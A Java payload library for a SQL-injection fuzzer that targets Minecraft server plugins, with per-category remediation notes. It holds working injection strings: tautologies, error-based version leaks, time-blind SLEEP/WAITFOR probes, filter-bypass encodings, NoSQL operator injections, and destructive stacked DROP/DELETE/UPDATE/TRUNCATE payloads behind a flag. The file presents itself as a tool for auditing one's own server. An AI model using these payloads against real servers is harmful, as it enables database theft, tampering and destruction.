package com.example.addon.modules.injection;

import java.util.ArrayList;
import java.util.List;

/**
 * AUDIT payload library for the SQL-injection fuzzer.
 *
 * Plugins that store economy / player data / shops / ranks / punishments in SQL
 * (MySQL, MariaDB, SQLite, Postgres, MSSQL) frequently build queries by string
 * concatenation of command arguments. If an argument reaches the query unsanitised,
 * the whole database is exposed. This is the curated set of values to push through a
 * command's injection point.
 *
 * RESPONSIBLE USE: this is for auditing a server you OWN so the plugin can be fixed.
 * Findings are client-side INFERENCE (a leaked DB error, an observable delay, a TPS
 * dip) — they flag CANDIDATES to confirm against the plugin's own query logs, not
 * proof. Every category documents the fix (parameterised queries / prepared
 * statements / input validation).
 *
 * SAFETY: payloads marked {@code destructive} contain stacked DROP/DELETE/UPDATE/
 * INSERT/TRUNCATE and WILL damage your own database if the plugin is vulnerable.
 * They are excluded unless the module's allow-destructive gate is on.
 *
 * CHAR-FILTER SAFE: every payload is ASCII-printable. Minecraft's command filter
 * rejects chars below 0x20 / 0x7F / the section sign and kicks before the plugin
 * sees them, so control chars are deliberately absent — they would test the server
 * filter, not the plugin's SQL.
 */
public final class InjectionPayloads {
    private InjectionPayloads() {}

    public enum Category { QUICK, CLASSIC, ERROR_BASED, TIME_BLIND, STACKED, ENCODED, NOSQL, SECOND_ORDER, ALL }

    /** One fuzz value. {@code delayMs} = expected server-side delay for time-based payloads (0 otherwise). */
    public record Payload(Category category, String text, boolean destructive, int delayMs, String note) {
        static Payload of(Category c, String t)                 { return new Payload(c, t, false, 0, ""); }
        static Payload note(Category c, String t, String n)     { return new Payload(c, t, false, 0, n); }
        static Payload time(Category c, String t, int ms)       { return new Payload(c, t, false, ms, "expects ~" + ms + "ms delay if executed"); }
        static Payload destr(Category c, String t)              { return new Payload(c, t, true, 0, "DESTRUCTIVE — modifies/deletes data if executed"); }
    }

    // --- Classic: quotes, comments, tautologies (non-destructive, read) ---
    private static final List<Payload> CLASSIC = List.of(
        Payload.of(Category.CLASSIC, "'"),
        Payload.of(Category.CLASSIC, "\""),
        Payload.of(Category.CLASSIC, "''"),
        Payload.of(Category.CLASSIC, "`"),
        Payload.of(Category.CLASSIC, "' OR '1'='1"),
        Payload.of(Category.CLASSIC, "' OR 1=1-- "),
        Payload.of(Category.CLASSIC, "' OR 1=1#"),
        Payload.of(Category.CLASSIC, "\" OR \"1\"=\"1"),
        Payload.of(Category.CLASSIC, "') OR ('1'='1"),
        Payload.of(Category.CLASSIC, "' OR '1'='1' -- "),
        Payload.of(Category.CLASSIC, "admin'-- "),
        Payload.of(Category.CLASSIC, "1' AND '1'='1"),
        Payload.of(Category.CLASSIC, "1 OR 1=1"),
        Payload.of(Category.CLASSIC, "'/*"),
        Payload.of(Category.CLASSIC, "*/")
    );

    // --- Error-based: provoke a DB error that leaks schema/version (non-destructive) ---
    private static final List<Payload> ERROR_BASED = List.of(
        Payload.note(Category.ERROR_BASED, "' AND extractvalue(1,concat(0x7e,version()))-- ", "MySQL extractvalue version leak"),
        Payload.note(Category.ERROR_BASED, "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- ", "MySQL updatexml version leak"),
        Payload.note(Category.ERROR_BASED, "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", "MySQL double-query error"),
        Payload.note(Category.ERROR_BASED, "' AND CAST((SELECT version()) AS int)-- ", "Postgres cast-error leak"),
        Payload.note(Category.ERROR_BASED, "' AND 1=CONVERT(int,(SELECT @@version))-- ", "MSSQL convert-error leak"),
        Payload.note(Category.ERROR_BASED, "' AND 1=(SELECT 1 FROM sqlite_master)-- ", "SQLite schema probe"),
        Payload.note(Category.ERROR_BASED, "1)) OR 1=1-- ", "bracket-balance error probe")
    );

    // --- Time-based blind: observable delay if executed (non-destructive) ---
    private static final List<Payload> TIME_BLIND = List.of(
        Payload.time(Category.TIME_BLIND, "' AND SLEEP(5)-- ", 5000),
        Payload.time(Category.TIME_BLIND, "' OR SLEEP(5)-- ", 5000),
        Payload.time(Category.TIME_BLIND, "'; WAITFOR DELAY '0:0:5'-- ", 5000),
        Payload.time(Category.TIME_BLIND, "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- ", 5000),
        Payload.time(Category.TIME_BLIND, "' || pg_sleep(5)-- ", 5000),
        Payload.time(Category.TIME_BLIND, "' AND BENCHMARK(3000000,MD5(1))-- ", 3000),
        Payload.time(Category.TIME_BLIND, "1 AND SLEEP(5)", 5000)
    );

    // --- Stacked queries: DESTRUCTIVE (gated) ---
    private static final List<Payload> STACKED = List.of(
        Payload.destr(Category.STACKED, "'; DROP TABLE players-- "),
        Payload.destr(Category.STACKED, "'; DELETE FROM users-- "),
        Payload.destr(Category.STACKED, "'; UPDATE players SET balance=999999999-- "),
        Payload.destr(Category.STACKED, "'; INSERT INTO users(name) VALUES('acaudit')-- "),
        Payload.destr(Category.STACKED, "'; TRUNCATE TABLE economy-- ")
    );

    // --- Encoded: hex / URL / char() to bypass naive string filters (non-destructive) ---
    private static final List<Payload> ENCODED = List.of(
        Payload.note(Category.ENCODED, "%27%20OR%201%3D1", "URL-encoded ' OR 1=1"),
        Payload.note(Category.ENCODED, "%2527%2520OR%25201%253D1", "double-URL-encoded ' OR 1=1"),
        Payload.note(Category.ENCODED, "0x27206f7220313d31", "hex of ' or 1=1"),
        Payload.note(Category.ENCODED, "CHAR(39)+OR+1=1", "MSSQL CHAR() quote"),
        Payload.note(Category.ENCODED, "CHAR(39,32,79,82,32,49,61,49)", "CHAR() sequence ' OR 1=1"),
        Payload.note(Category.ENCODED, "'+(SELECT'')+'", "string-concat splice")
    );

    // --- NoSQL (MongoDB): for plugins building Mongo queries from strings/JSON (non-destructive) ---
    private static final List<Payload> NOSQL = List.of(
        Payload.note(Category.NOSQL, "' || '1'=='1", "JS tautology"),
        Payload.note(Category.NOSQL, "{\"$ne\": null}", "$ne operator injection"),
        Payload.note(Category.NOSQL, "{\"$gt\": \"\"}", "$gt operator injection"),
        Payload.note(Category.NOSQL, "[$ne]=1", "bracket operator (form-style)"),
        Payload.note(Category.NOSQL, "'; return true; var x='", "JS function injection"),
        Payload.note(Category.NOSQL, "{\"$where\": \"sleep(5000)\"}", "$where time probe")
    );

    // --- Second-order: stored now, executed when read back later (non-destructive payload body) ---
    private static final List<Payload> SECOND_ORDER = List.of(
        Payload.note(Category.SECOND_ORDER, "ACAUDIT_SO_' OR '1'='1", "store, then read via another command"),
        Payload.note(Category.SECOND_ORDER, "ACAUDIT_SO_'||(SELECT version())||'", "stored version-leak; trigger on read"),
        Payload.note(Category.SECOND_ORDER, "x'-- ACAUDIT-SENTINEL", "stored comment; trigger on read"),
        Payload.note(Category.SECOND_ORDER, "ACAUDIT_SO_'; SELECT 1-- ", "stored stacked; trigger on read")
    );

    /** Small, representative first-pass set. */
    private static final List<Payload> QUICK = List.of(
        Payload.of(Category.QUICK, "'"),
        Payload.of(Category.QUICK, "' OR 1=1-- "),
        Payload.of(Category.QUICK, "\" OR \"1\"=\"1"),
        Payload.note(Category.QUICK, "' AND extractvalue(1,concat(0x7e,version()))-- ", "MySQL error leak"),
        Payload.time(Category.QUICK, "' AND SLEEP(5)-- ", 5000)
    );

    /** All payloads of a category, before the destructive filter. */
    public static List<Payload> forCategory(Category c) {
        return switch (c) {
            case QUICK -> QUICK;
            case CLASSIC -> CLASSIC;
            case ERROR_BASED -> ERROR_BASED;
            case TIME_BLIND -> TIME_BLIND;
            case STACKED -> STACKED;
            case ENCODED -> ENCODED;
            case NOSQL -> NOSQL;
            case SECOND_ORDER -> SECOND_ORDER;
            case ALL -> {
                List<Payload> all = new ArrayList<>();
                all.addAll(CLASSIC); all.addAll(ERROR_BASED); all.addAll(TIME_BLIND);
                all.addAll(ENCODED); all.addAll(NOSQL); all.addAll(SECOND_ORDER); all.addAll(STACKED);
                yield all;
            }
        };
    }

    /** Category payloads with destructive ones removed unless allowed. */
    public static List<Payload> select(Category c, boolean allowDestructive) {
        List<Payload> out = new ArrayList<>();
        for (Payload p : forCategory(c)) if (allowDestructive || !p.destructive()) out.add(p);
        return out;
    }

    /** Per-category responsible-disclosure documentation (test / vulnerable / hardened / fix / engines). */
    public static String[] doc(Category c) {
        return switch (c) {
            case CLASSIC -> new String[]{
                "Tests: quote-breakout and boolean tautologies (' OR 1=1) terminating or always-truing a WHERE clause.",
                "Vulnerable: the row set changes (login bypass, all rows returned), or a quote triggers a syntax error.",
                "Hardened: the value is treated as data — no clause change, no error; an invalid number is rejected cleanly.",
                "Fix: parameterised queries / prepared statements; never concatenate args into SQL; validate types.",
                "Engines: MySQL, MariaDB, SQLite, Postgres, MSSQL, Oracle."};
            case ERROR_BASED -> new String[]{
                "Tests: functions (extractvalue/updatexml/cast/convert) that fail in a way that prints schema/version.",
                "Vulnerable: a DB error or version/table name is echoed to chat (or a stack trace).",
                "Hardened: no DB internals ever reach the client; errors are logged server-side and a generic message shown.",
                "Fix: prepared statements + never surface raw SQLException text to players.",
                "Engines: MySQL/MariaDB (extractvalue/updatexml), Postgres (cast), MSSQL (convert), SQLite."};
            case TIME_BLIND -> new String[]{
                "Tests: SLEEP/PG_SLEEP/WAITFOR/BENCHMARK — no output needed; execution is inferred from a delay.",
                "Vulnerable: the response (or server tick) is delayed by ~the requested time when the payload is present.",
                "Hardened: response time is unchanged; the literal string is stored/parsed as data.",
                "Fix: prepared statements; the engine never parses user text as SQL keywords.",
                "Engines: MySQL/MariaDB (SLEEP/BENCHMARK), Postgres (pg_sleep), MSSQL (WAITFOR)."};
            case STACKED -> new String[]{
                "Tests: a semicolon then a second statement (DROP/DELETE/UPDATE/INSERT/TRUNCATE). DESTRUCTIVE.",
                "Vulnerable: the second statement executes — data altered or destroyed. (Audit your OWN DB only.)",
                "Hardened: stacked statements are rejected by the driver / not permitted; the value is inert data.",
                "Fix: prepared statements (one statement per call); disable multi-statements on the connection.",
                "Engines: MySQL with allowMultiQueries, MSSQL, Postgres; SQLite via exec()."};
            case ENCODED -> new String[]{
                "Tests: hex/URL/CHAR() encodings of classic payloads to bypass a naive blocklist filter.",
                "Vulnerable: a string filter passes the encoded form, which the DB/plugin then decodes and executes.",
                "Hardened: encoding is irrelevant because input is parameterised, not filtered by blocklist.",
                "Fix: don't rely on blocklists; use prepared statements and canonicalise+validate input.",
                "Engines: all (filter-bypass class)."};
            case NOSQL -> new String[]{
                "Tests: operator/JS injection ($ne/$gt/$where, function bodies) for plugins building Mongo queries from strings.",
                "Vulnerable: the operator changes match semantics (returns all / bypasses auth) or $where runs JS.",
                "Hardened: input is bound as a value, never interpreted as a query operator; $where disabled.",
                "Fix: typed query builders; reject object/operator input where a scalar is expected; disable server-side JS.",
                "Engines: MongoDB."};
            case SECOND_ORDER -> new String[]{
                "Tests: a payload stored now (name/description) that injects when a LATER query reads it back unparameterised.",
                "Vulnerable: the stored value triggers the injection on a subsequent read/report command — not at store time.",
                "Hardened: reads of stored data are parameterised too, so stored text stays inert.",
                "Fix: parameterise EVERY query, including those over already-stored data; this is mostly manual to confirm.",
                "Engines: all."};
            default -> new String[]{"Mixed / representative set."};
        };
    }
}
